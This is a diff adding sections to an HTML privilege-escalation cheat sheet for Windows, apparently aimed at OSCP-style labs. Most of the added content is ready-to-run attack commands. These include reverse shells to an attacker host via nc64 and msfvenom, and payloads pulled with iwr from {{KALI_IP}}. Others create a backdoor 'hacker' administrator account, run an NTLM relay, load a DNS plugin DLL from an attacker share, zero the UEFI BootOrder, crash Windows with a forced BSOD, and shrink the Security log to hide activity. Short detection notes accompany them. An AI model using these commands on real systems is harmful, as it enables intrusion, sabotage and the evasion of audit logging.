@@ -1278,9 +1278,141 @@ REM -i source file | -o destination (no drive letter, relative to C:\)</div>
         </div>
       </div>
 
+      <!-- RemotePotato0 -->
+      <div class="section">
+        <div class="section-header">&#128249; RemotePotato0 &mdash; Cross-Session DCOM Token Steal (antonioCoco)</div>
+        <div class="section-body">
+          <div class="alert alert-red">
+            <span class="alert-icon">!</span>
+            <span><strong>Requires two conditions:</strong> (1) A high-privileged user (e.g. admin/SYSTEM) is logged into a different session on the same machine. (2) You can run a NTLM relay on Kali (impacket-ntlmrelayx). Works on Win7&ndash;Win10/Server 2019 — not patched in the standard Potato mitigations.</span>
+          </div>
+          <div class="flow-chain">
+            <div class="flow-node">SeImpersonate</div><div class="flow-arrow">&rarr;</div>
+            <div class="flow-node">DCOM activation</div><div class="flow-arrow">&rarr;</div>
+            <div class="flow-node">Coerce SYSTEM NTLM auth</div><div class="flow-arrow">&rarr;</div>
+            <div class="flow-node">ntlmrelayx intercepts</div><div class="flow-arrow">&rarr;</div>
+            <div class="flow-node">Relay to ldap/smb</div><div class="flow-arrow">&rarr;</div>
+            <div class="flow-node">&#127919; Priv escalation</div>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Kali &mdash; Start NTLM relay listener (relay to LDAP or SMB of DC)</div>
+              <div class="code-block purple">sudo impacket-ntlmrelayx -t ldap://{{TARGET}} --no-wcf-server --escalate-user {{USER}}
+REM Alternative: relay to SMB if you want a shell
+sudo impacket-ntlmrelayx -t smb://{{TARGET}} -socks</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Transfer RemotePotato0 to target</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/RemotePotato0.exe -o {{WPATH}}\RemotePotato0.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Run RemotePotato0 — coerces SYSTEM auth to your relay</div>
+              <div class="code-block green">REM Standard: coerce DCOM activation to Kali relay on port 9999
+.\RemotePotato0.exe -m 0 -r {{KALI_IP}} -x {{KALI_IP}} -p 9999 -s 1
+REM -m 0 = method 0 (DCOM + coerce), -r redirector IP, -x our host, -p relay port, -s target session ID
+REM Check what sessions exist:
+qwinsta
+query user</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Kali &mdash; Start socat redirector (RemotePotato0 needs port redirect on Kali)</div>
+              <div class="code-block purple">sudo socat TCP-LISTEN:9999,fork,reuseaddr TCP:127.0.0.1:9999 &amp;</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">5</div>
+            <div class="step-content">
+              <div class="step-title">ntlmrelayx captures SYSTEM NTLM hash or upgrades privileges</div>
+              <div class="code-block">REM ntlmrelayx will show captured auth or confirm escalation
+REM LDAP relay: adds your user to Domain Admins or grants DCSync rights
+REM SMB relay: hash capture for cracking (hashcat -m 5600) or PTH</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span><strong>When to use:</strong> You have SeImpersonate on a domain machine AND another privileged session is active. Skips the Spooler/DCOM dependency of potato attacks. Requires outbound from target to Kali:9999. Methods: -m 0 (DCOM), -m 1 (WinRM), -m 2 (RPC).</span>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">&#128279;</span>
+            <span>GitHub: <a href="https://github.com/antonioCoco/RemotePotato0" target="_blank">github.com/antonioCoco/RemotePotato0</a></span>
+          </div>
+        </div>
+      </div>
+
+      <!-- RogueWinRM -->
+      <div class="section">
+        <div class="section-header">&#128329; RogueWinRM &mdash; Port 5985 Race (WinRM must be disabled on target)</div>
+        <div class="section-body">
+          <div class="alert alert-red">
+            <span class="alert-icon">!</span>
+            <span><strong>HARD REQUIREMENT: WinRM service must NOT be running on port 5985.</strong> RogueWinRM binds a fake WinRM listener on port 5985. When the Windows Remote Management service tries to start (or plugins authenticate), it connects to your fake listener — you capture SYSTEM credentials via NTLM negotiation and impersonate them. If WinRM is already running, port 5985 is taken and this fails.</span>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Check if WinRM is running (port 5985)</div>
+              <div class="code-block">netstat -an | findstr :5985
+sc query winrm
+REM If RUNNING/LISTEN on 5985 -- this technique WILL NOT WORK; use a potato instead</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Transfer RogueWinRM</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/RogueWinRM.exe -o {{WPATH}}\RogueWinRM.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Start Kali nc listener</div>
+              <div class="code-block green">nc -lvnp {{PORT}}</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Run RogueWinRM on target &mdash; will listen on 5985 and run command as SYSTEM</div>
+              <div class="code-block green">REM Non-interactive reverse shell:
+.\RogueWinRM.exe -p "{{WPATH}}\nc64.exe" -a "{{KALI_IP}} {{PORT}} -e cmd"
+REM Interactive (spawns cmd in current console, requires SeImpersonate):
+.\RogueWinRM.exe -p C:\Windows\System32\cmd.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">5</div>
+            <div class="step-content">
+              <div class="step-title">Trigger: RogueWinRM waits for SYSTEM connection — force BITS/Update service to trigger auth</div>
+              <div class="code-block">REM RogueWinRM may self-trigger by waiting; or force with:
+sc stop BITS &amp;&amp; sc start BITS
+REM The BITS service calls WinRM on 5985 at startup → connects to your fake listener → SYSTEM token</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span><strong>Flags:</strong> <code>-p &lt;prog&gt;</code> program to execute as SYSTEM | <code>-a &lt;args&gt;</code> arguments | <code>-l &lt;port&gt;</code> override listen port (default: 5985). Tested on IIS AppPool \ (Win10, Server 2016/2019).</span>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">&#128279;</span>
+            <span>GitHub: <a href="https://github.com/antonioCoco/RogueWinRM" target="_blank">github.com/antonioCoco/RogueWinRM</a></span>
+          </div>
+        </div>
+      </div>
+
       <div class="detection-box">
         <div class="detection-title">&#128269; Detection</div>
-        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4672 &rarr; SYSTEM logon with SeImpersonate &bull; Event 4688 &rarr; new process from w3wp.exe/sqlservr.exe &rarr; cmd.exe/powershell.exe &bull; Event 10016 DCOM activation from service accounts &bull; Named pipe creation matching potato patterns &bull; spoolsv.exe spawning unexpected child processes (PrintSpoofer) &bull; Scheduled task creation by service accounts (FullPowers mechanism)</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4672 &rarr; SYSTEM logon with SeImpersonate &bull; Event 4688 &rarr; new process from w3wp.exe/sqlservr.exe &rarr; cmd.exe/powershell.exe &bull; Event 10016 DCOM activation from service accounts &bull; Named pipe creation matching potato patterns &bull; spoolsv.exe spawning unexpected child processes (PrintSpoofer) &bull; Scheduled task creation by service accounts (FullPowers mechanism) &bull; Port 5985 binding from non-WinRM process (RogueWinRM) &bull; Unexpected outbound NTLM to external relay (RemotePotato0)</div>
       </div>
     </div>
 
@@ -2200,9 +2332,60 @@ reg save HKLM\SYSTEM C:\Temp\system
         </div>
       </div>
 
+      <div class="section">
+        <div class="section-header">&#9889; Method 4 &mdash; Service Binary Replacement (SYSTEM without RDP)</div>
+        <div class="section-body">
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span>When no RDP access is available (Methods 1&ndash;3 need lock screen), target a SYSTEM service binary instead. Take ownership, grant write, replace the binary with your payload, restart the service.</span>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Find a SYSTEM service with a replaceable binary</div>
+              <div class="code-block">wmic service where "StartName='LocalSystem'" get Name,PathName,State | findstr /i "stopped\|running"
+REM Target a stopped or restartable service</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Backup and take ownership of the service binary</div>
+              <div class="code-block">copy "C:\Program Files\VulnSvc\svc.exe" C:\Temp\svc.exe.bak
+takeown /f "C:\Program Files\VulnSvc\svc.exe"
+icacls "C:\Program Files\VulnSvc\svc.exe" /grant "%USERNAME%":F</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Generate and transfer nc64-based reverse shell or adduser exe, then copy over binary</div>
+              <div class="code-block purple">REM Kali: generate reverse shell EXE
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{PORT}} -f exe -o svc.exe
+REM Or: adduser-style payload (no listener needed):
+msfvenom -p windows/x64/exec CMD="net user hacker P@ssw0rd1 /add &amp;&amp; net localgroup administrators hacker /add" -f exe -o svc.exe
+REM Transfer to target and replace:
+iwr http://{{KALI_IP}}:{{PORT}}/windows/svc.exe -o C:\Temp\svc.exe
+copy /Y C:\Temp\svc.exe "C:\Program Files\VulnSvc\svc.exe"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Start listener on Kali (if reverse shell), then restart service</div>
+              <div class="code-block green">nc -lvnp {{PORT}}
+REM On target:
+sc stop VulnSvc
+sc start VulnSvc
+REM Shell arrives as SYSTEM</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
       <div class="detection-box">
         <div class="detection-title">Detection</div>
-        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4670 — permissions on object changed • Event 4663 — write access on system binaries • takeown.exe execution • icacls modifying System32 files • Ownership change on system binaries or registry keys • utilman.exe / sethc.exe hash change</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4670 — permissions on object changed • Event 4663 — write access on system binaries • takeown.exe execution • icacls modifying System32 files • Ownership change on system binaries or registry keys • utilman.exe / sethc.exe hash change • Service binary hash change (Sysmon Event 1)</div>
       </div>
     </div>
 
@@ -2284,8 +2467,21 @@ iwr http://{{KALI_IP}}:{{PORT}}/windows/szkg64exploit.exe -o C:\Temp\szkg64explo
 
       <!-- Legacy: Capcom -->
       <div class="section">
-        <div class="section-header">⚡ Vector 2 — EOPLOADDRIVER + Capcom.sys + ExploitCapcom (LEGACY — blocked on modern Windows)</div>
+        <div class="section-header">&#9889; Vector 2 &mdash; EOPLOADDRIVER + Capcom.sys + ExploitCapcom (LEGACY &mdash; blocked on modern Windows)</div>
         <div class="section-body">
+          <div class="step">
+            <div class="step-num">0</div>
+            <div class="step-content">
+              <div class="step-title">Download required tools to target (if not already present from Vector 1)</div>
+              <div class="code-block purple">REM eoploaddriver (same as Vector 1):
+iwr http://{{KALI_IP}}:{{PORT}}/windows/eoploaddriver_x64.exe -o C:\Temp\eoploaddriver_x64.exe
+REM Capcom.sys vulnerable driver (get from: github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys):
+iwr http://{{KALI_IP}}:{{PORT}}/windows/Capcom.sys -o C:\Temp\Capcom.sys
+REM ExploitCapcom compiled binary with CLI args (fork of tandasat/ExploitCapcom):
+REM github.com/tandasat/ExploitCapcom OR k4sth4/SeLoadDriverPrivilege precompiled release:
+iwr http://{{KALI_IP}}:{{PORT}}/windows/ExploitCapcom.exe -o C:\Temp\ExploitCapcom.exe</div>
+            </div>
+          </div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
@@ -2418,14 +2614,48 @@ iwr http://{{KALI_IP}}:{{PORT}}/windows/szkg64exploit.exe -o C:\Temp\szkg64explo
         </div>
       </div>
 
+      <!-- PsBits alternative -->
+      <div class="section">
+        <div class="section-header">&#9889; Alternative &mdash; PsBits (s3cur3th1ssh1t) &mdash; S4U Token via SeTcbPrivilege</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Download PsBits to target (compile from source on Kali if needed)</div>
+              <div class="code-block purple">REM PsBits provides Get-System with SeTcb/S4U method
+REM github.com/mgeeky/PackMyPayload for packaging OR compile PsBits.cs:
+iwr http://{{KALI_IP}}:{{PORT}}/windows/PsBits.exe -o C:\Temp\PsBits.exe
+REM Source: github.com/s3cur3th1ssh1t/PsBits (Go-based, S4U token via SeTcbPrivilege)</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Execute PsBits to spawn SYSTEM shell</div>
+              <div class="code-block green">.\PsBits.exe "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"
+REM Or simply spawn an interactive cmd:
+.\PsBits.exe cmd.exe</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span>PsBits uses <code>LsaLogonUser</code> with S4U (same mechanism as TcbElevation) but written in Go. Works as a fallback if TcbElevation.exe errors. Compile on Kali: <code>git clone github.com/s3cur3th1ssh1t/PsBits &amp;&amp; go build -o PsBits.exe .</code></span>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">&#128279;</span>
+            <span>GitHub: <a href="https://github.com/s3cur3th1ssh1t/PsBits" target="_blank">github.com/s3cur3th1ssh1t/PsBits</a></span>
+          </div>
+        </div>
+      </div>
+
       <div class="alert alert-gold">
         <span class="alert-icon">💡</span>
         <span><strong>Rarity note:</strong> SeTcbPrivilege is almost never granted to regular accounts. Expect it on specialized service accounts, misconfigured Windows services, or CTF/exam environments. If you see it in <code>whoami /priv</code> — it is an instant SYSTEM escalation.</span>
       </div>
 
       <div class="detection-box">
-        <div class="detection-title">🔍 Detection</div>
-        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">LsaLogonUser S4U call from non-SYSTEM process • Event 4624 logon type 5 (Service) for SYSTEM account created by unusual parent • Event 4672 SeTcbPrivilege assigned to new token • SYSTEM-integrity child process spawned by unusual parent • TcbElevation.exe execution</div>
+        <div class="detection-title">&#128269; Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">LsaLogonUser S4U call from non-SYSTEM process &bull; Event 4624 logon type 5 (Service) for SYSTEM account created by unusual parent &bull; Event 4672 SeTcbPrivilege assigned to new token &bull; SYSTEM-integrity child process spawned by unusual parent &bull; TcbElevation.exe or PsBits.exe execution</div>
       </div>
     </div>
 
@@ -2590,15 +2820,27 @@ auditpol /set /subcategory:"Process Creation" /success:disable
 auditpol /set /subcategory:"Logon" /success:enable /failure:enable</div>
             </div>
           </div>
+          <div class="step">
+            <div class="step-num">5</div>
+            <div class="step-content">
+              <div class="step-title">Shrink Security log to near-zero (forces overwrite/flush of all existing entries)</div>
+              <div class="code-block orange">REM Set Security log max size to 1 KB — forces immediate flush + rollover of existing events:
+wevtutil sl Security /ms:1
+REM Restore to 20MB default when done:
+wevtutil sl Security /ms:20971520
+REM Check current log size and max:
+wevtutil gli Security | findstr /i "maxSize\|fileSize\|numberOfLogRecords"</div>
+            </div>
+          </div>
           <div class="alert alert-gold">
-            <span class="alert-icon">💡</span>
-            <span><strong>Opsec play:</strong> Before exploitation on a real engagement, use SeSecurityPrivilege to read what audit policies are active, then temporarily disable logging for your specific actions. Re-enable before leaving.</span>
+            <span class="alert-icon">&#9733;</span>
+            <span><strong>Opsec play:</strong> Before exploitation on a real engagement, use SeSecurityPrivilege to read what audit policies are active, then temporarily disable logging for your specific actions. <code>wevtutil sl Security /ms:1</code> plus <code>wevtutil cl Security</code> is more thorough than clearing alone — the shrink flushes buffered entries that <code>cl</code> alone might miss. Re-enable/restore before leaving.</span>
           </div>
         </div>
       </div>
       <div class="detection-box">
         <div class="detection-title">Detection</div>
-        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 1102 — Security audit log cleared • Event 4719 — audit policy changed • Event 4907 — auditing settings changed on object • wevtutil.exe with "cl" argument</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 1102 — Security audit log cleared &bull; Event 4719 — audit policy changed &bull; Event 4907 — auditing settings changed on object &bull; wevtutil.exe with "cl" or "sl" argument &bull; Security log max size drastically reduced (Event 6005 on restart)</div>
       </div>
     </div>
 
@@ -2625,11 +2867,24 @@ auditpol /set /subcategory:"Logon" /success:enable /failure:enable</div>
             <div class="flow-node">SYSTEM</div>
           </div>
           <div class="step">
+            <div class="step-num">0</div>
+            <div class="step-content">
+              <div class="step-title">Transfer procmon.exe (Sysinternals) to target for monitoring</div>
+              <div class="code-block purple">REM Download Procmon from Sysinternals (or mirror from your toolkit server):
+iwr http://{{KALI_IP}}:{{PORT}}/windows/procmon.exe -o {{WPATH}}\procmon.exe
+REM Or use Procmon64.exe for 64-bit targets:
+iwr http://{{KALI_IP}}:{{PORT}}/windows/Procmon64.exe -o {{WPATH}}\Procmon64.exe
+REM Accept EULA silently and start capturing:
+.\procmon.exe /accepteula /quiet</div>
+            </div>
+          </div>
+          <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
               <div class="step-title">Find services writing predictable files to user-writable paths</div>
-              <div class="code-block">procmon.exe  # Filter: Path contains C:\Temp OR C:\ProgramData, Operation=WriteFile, User=SYSTEM
-# Look for log files, temp files, cache files written by SYSTEM services</div>
+              <div class="code-block">procmon.exe  REM Filter: Path contains C:\Temp OR C:\ProgramData, Operation=WriteFile, User=SYSTEM
+REM Look for log files, temp files, cache files written by SYSTEM services
+REM procmon filter: Process Name is NOT procmon.exe; AND User is SYSTEM; AND Result is SUCCESS; AND Operation is WriteFile</div>
             </div>
           </div>
           <div class="step">
@@ -2684,31 +2939,89 @@ cmd /c mklink "C:\Python39\version.dll" "C:\Temp\evil.dll"
     <!-- SeSystemEnvironmentPrivilege -->
     <div id="page-sesysenv" class="page">
       <div class="page-header">
-        <div class="page-title">⚙️ SeSystemEnvironmentPrivilege <span class="severity-badge sev-gold">UNCOMMON</span></div>
-        <div class="page-sub">// MODIFY UEFI/FIRMWARE VARS → PERSISTENT BOOTKIT / BYPASS SECUREBOOT</div>
+        <div class="page-title">&#9881;&#65039; SeSystemEnvironmentPrivilege <span class="severity-badge sev-gold">UNCOMMON</span></div>
+        <div class="page-sub">// MODIFY UEFI/FIRMWARE VARS + SYSPREP DLL HIJACK → SYSTEM</div>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Rarely delegated; some backup/update agents</div></div>
+        <div class="info-card"><div class="info-label">Primary Attack</div><div class="info-value">sysprep.exe DLL hijack → SYSTEM (if UAC bypass context)</div></div>
+        <div class="info-card"><div class="info-label">Alt Attack</div><div class="info-value">UEFI/NVRAM variable abuse (persistence)</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">SYSTEM shell or persistent firmware implant</div></div>
       </div>
       <div class="section">
-        <div class="section-header">⚡ Attack — Firmware Variable Abuse</div>
+        <div class="section-header">&#9889; Attack 1 &mdash; sysprep.exe DLL Hijack (SYSTEM via auto-elevated process)</div>
         <div class="section-body">
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span><code>sysprep.exe</code> is an auto-elevated binary (manifest: requireAdministrator, autoElevate=true). It loads DLLs from its own directory before System32. Drop a malicious DLL into <code>C:\Windows\System32\Sysprep\</code> and run sysprep — DLL runs as SYSTEM via the auto-elevation. SeSystemEnvironmentPrivilege is sometimes the indicator that the account has write access to system areas.</span>
+          </div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Read/write UEFI variables via PowerShell</div>
-              <div class="code-block purple">[System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
-# Use GetFirmwareEnvironmentVariable / SetFirmwareEnvironmentVariable Win32 APIs</div>
+              <div class="step-title">Generate malicious DLL on Kali</div>
+              <div class="code-block purple">REM DLL for reverse shell:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{PORT}} -f dll -o cryptbase.dll
+REM Or adduser DLL (no listener needed):
+msfvenom -p windows/x64/exec CMD="net user hacker P@ssw0rd1 /add &amp;&amp; net localgroup administrators hacker /add" -f dll -o cryptbase.dll</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Primary use case: persistent implant in firmware</div>
-              <div class="code-block orange"># Advanced — used for UEFI-level persistence beyond OS reinstall
-# Also abusable to corrupt boot configuration</div>
+              <div class="step-title">Transfer DLL to target sysprep directory</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/cryptbase.dll -o C:\Windows\System32\Sysprep\cryptbase.dll
+REM Also try: actionqueue.dll, dbgcore.dll, mscoree.dll (all loaded by sysprep.exe — verify with procmon)</div>
             </div>
           </div>
-          <div class="alert alert-gold">
-            <span class="alert-icon">💡</span>
-            <span>Rarely seen in OSCP labs — more relevant in red team/APT simulation. If present, check for boot config manipulation.</span>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Start listener on Kali</div>
+              <div class="code-block green">nc -lvnp {{PORT}}</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Trigger: run sysprep.exe (auto-elevates to SYSTEM and loads your DLL)</div>
+              <div class="code-block green">C:\Windows\System32\Sysprep\sysprep.exe
+REM Shell arrives as SYSTEM on listener</div>
+            </div>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">&#128279;</span>
+            <span>Reference: <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking" target="_blank">HackTricks DLL Hijacking</a> | Use procmon to confirm DLL load order for sysprep.exe on your specific OS build</span>
+          </div>
+        </div>
+      </div>
+      <div class="section">
+        <div class="section-header">&#9889; Attack 2 &mdash; Firmware Variable Abuse (persistence / UEFI-level)</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Read/write UEFI variables via PowerShell Win32 API</div>
+              <div class="code-block purple">REM Read UEFI variable:
+$definition = @"
+using System;using System.Runtime.InteropServices;
+public class UefiVar {
+  [DllImport("kernel32.dll",SetLastError=true)]
+  public static extern uint GetFirmwareEnvironmentVariable(string lpName,string lpGuid,byte[] pBuffer,uint nSize);
+  [DllImport("kernel32.dll",SetLastError=true)]
+  public static extern bool SetFirmwareEnvironmentVariable(string lpName,string lpGuid,byte[] pValue,uint nSize);
+}
+"@
+Add-Type $definition
+REM Read BootOrder:
+$buf = New-Object byte[] 256
+[UefiVar]::GetFirmwareEnvironmentVariable("BootOrder","{8be4df61-93ca-11d2-aa0d-00e098032b8c}",$buf,256)
+REM Zero out BootOrder for boot configuration corruption (advanced/destructive — lab only):
+[UefiVar]::SetFirmwareEnvironmentVariable("BootOrder","{8be4df61-93ca-11d2-aa0d-00e098032b8c}",$null,0)</div>
+            </div>
+          </div>
+          <div class="alert alert-red">
+            <span class="alert-icon">!</span>
+            <span>UEFI variable manipulation is destructive and persistent beyond OS reinstall. Only use on lab/exam VMs — not on real hardware. Firmware variable access also requires UEFI mode (not Legacy BIOS). Check: <code>bcdedit | findstr /i uefi</code></span>
           </div>
         </div>
       </div>
@@ -2738,9 +3051,50 @@ cmd /c mklink "C:\Python39\version.dll" "C:\Temp\evil.dll"
 sc start VulnerableService</div>
             </div>
           </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Log off current session (less disruptive than full reboot)</div>
+              <div class="code-block">shutdown /l
+REM Forces current user session logoff — services not restarted</div>
+            </div>
+          </div>
           <div class="alert alert-gold">
-            <span class="alert-icon">💡</span>
+            <span class="alert-icon">&#9733;</span>
             <span>Useful when you've planted a payload that needs a reboot to trigger (service, Run key, scheduled task). Also useful for race condition exploits.</span>
+          </div>
+        </div>
+      </div>
+      <div class="section">
+        <div class="section-header">&#9889; Alternative &mdash; NtRaiseHardError BSOD (force crash without shutdown.exe)</div>
+        <div class="section-body">
+          <div class="alert alert-red">
+            <span class="alert-icon">!</span>
+            <span><strong>Destructive &mdash; causes immediate BSOD/crash.</strong> SeShutdownPrivilege is not strictly required for NtRaiseHardError from user mode, but the combination confirms shutdown-level rights. Use only when a crash/reboot is intentional (e.g. triggering a service at next boot that runs your payload).</span>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">PowerShell &mdash; force BSOD via NtRaiseHardError syscall</div>
+              <div class="code-block orange">$def = @"
+using System;using System.Runtime.InteropServices;
+public class Crash {
+  [DllImport("ntdll.dll")]
+  public static extern uint NtRaiseHardError(uint ErrorStatus,uint NumberOfParameters,uint UnicodeStringParameterMask,IntPtr Parameters,uint ValidResponseOption,out uint Response);
+  [DllImport("ntdll.dll")]
+  public static extern uint RtlAdjustPrivilege(int Privilege,bool Enable,bool CurrentThread,out bool Enabled);
+}
+"@
+Add-Type $def
+$p = $false
+[Crash]::RtlAdjustPrivilege(19,$true,$false,[ref]$p)   # 19 = SeShutdownPrivilege
+$r = 0
+[Crash]::NtRaiseHardError(0xc0000022,0,0,[IntPtr]::Zero,6,[ref]$r)</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span><strong>Use case:</strong> If a persistence payload is in place (Run key, service binary) and you need to force a reboot to trigger it without running <code>shutdown.exe</code> (which may be monitored). NtRaiseHardError with option 6 causes an immediate BSOD and reboot. <code>RtlAdjustPrivilege(19,...)</code> enables SeShutdownPrivilege in the current token before the call.</span>
           </div>
         </div>
       </div>
@@ -2990,10 +3344,22 @@ whoami /groups | findstr /i dns</div>
             <div class="step-content">
               <div class="step-title">Configure DNS server plugin DLL via dnscmd (MUST include DC hostname)</div>
               <div class="code-block purple">dnscmd dc01 /config /serverlevelplugindll \\{{KALI_IP}}\share\evil.dll
-# IMPORTANT: "dc01" = your DC's hostname (use: nslookup or net group "Domain Controllers" /domain)
-# Only omit the hostname if running this command DIRECTLY on the DC itself
-# Verify setting was applied:
+REM IMPORTANT: "dc01" = your DC's hostname (use: nslookup or net group "Domain Controllers" /domain)
+REM Only omit the hostname if running this command DIRECTLY on the DC itself
+REM Verify setting was applied:
 Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters -Name ServerLevelPluginDll</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">5a</div>
+            <div class="step-content">
+              <div class="step-title">If ALREADY ON THE DC &mdash; use local hostname or omit entirely</div>
+              <div class="code-block purple">REM You are on the DC itself — no hostname needed (or use "." or local hostname):
+dnscmd . /config /serverlevelplugindll \\{{KALI_IP}}\share\evil.dll
+REM Or use the DC's own computername:
+dnscmd %COMPUTERNAME% /config /serverlevelplugindll \\{{KALI_IP}}\share\evil.dll
+REM Alternative: write directly to registry if dnscmd is not available:
+reg add HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll /t REG_SZ /d "\\{{KALI_IP}}\share\evil.dll" /f</div>
             </div>
           </div>
           <div class="step">
@@ -3188,13 +3554,17 @@ iwr http://{{KALI_IP}}:{{PORT}}/windows/ExploitCapcom.exe -OutFile C:\Temp\Explo
               <div class="code-block">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f exe -o shell.exe</div>
             </div>
           </div>
+          <div class="alert alert-red">
+            <span class="alert-icon">!</span>
+            <span><strong>Capcom.sys is on Microsoft's Vulnerable Driver Blocklist</strong> and will fail to load on Windows 11 22H2+ and patched Server 2022. Use <strong>szkg64.sys + szkg64exploit.exe</strong> instead on modern targets. See the SeLoadDriverPrivilege page for the full szkg64 workflow.</span>
+          </div>
           <div class="alert alert-gold">
-            <span class="alert-icon">💡</span>
+            <span class="alert-icon">&#9733;</span>
             <span><strong>SeLoadDriverPrivilege may be disabled by default</strong> even if listed. EOPLOADDRIVER.exe handles enabling it automatically before loading the driver.</span>
           </div>
           <div class="alert alert-teal">
-            <span class="alert-icon">🔗</span>
-            <span>EOPLOADDRIVER: <a href="https://github.com/TarlogicSecurity/EoPLoadDriver" target="_blank">github.com/TarlogicSecurity/EoPLoadDriver</a> | Reference: <a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/" target="_blank">tarlogic.com — SeLoadDriverPrivilege</a></span>
+            <span class="alert-icon">&#128279;</span>
+            <span>EOPLOADDRIVER: <a href="https://github.com/TarlogicSecurity/EoPLoadDriver" target="_blank">github.com/TarlogicSecurity/EoPLoadDriver</a> | Capcom.sys source: <a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" target="_blank">github.com/FuzzySecurity/Capcom-Rootkit</a> | ExploitCapcom: <a href="https://github.com/tandasat/ExploitCapcom" target="_blank">github.com/tandasat/ExploitCapcom</a> | CLI fork: <a href="https://github.com/k4sth4/SeLoadDriverPrivilege" target="_blank">github.com/k4sth4/SeLoadDriverPrivilege</a> | szkg64 (modern): <a href="https://github.com/padovah4ck/CVE-2018-15732" target="_blank">github.com/padovah4ck/CVE-2018-15732</a></span>
           </div>
         </div>
       </div>
@@ -3207,36 +3577,99 @@ iwr http://{{KALI_IP}}:{{PORT}}/windows/ExploitCapcom.exe -OutFile C:\Temp\Explo
     <!-- FullPowers -->
     <div id="page-fullpowers" class="page">
       <div class="page-header">
